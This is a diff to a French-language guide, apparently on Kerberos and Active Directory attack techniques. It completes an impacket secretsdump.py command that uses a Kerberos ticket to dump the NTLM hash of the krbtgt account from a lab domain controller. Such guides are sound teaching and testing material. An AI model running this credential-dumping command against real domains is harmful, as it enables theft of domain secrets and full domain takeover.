@@ -196,7 +196,7 @@ export KRB5CCNAME='/chemin/vers/random_user.ccache'
 Enfin, tous les outils de la suite `impacket` peuvent être utilisés avec ce ticket, via l'option `-k`
 
 ```bash
-secretsdump.py -k DC-01.adsec.local -just-dc-ntlm -just-dc-user 
+secretsdump.py -k DC-01.adsec.local -just-dc-ntlm -just-dc-user krbtgt
 ```
 
 
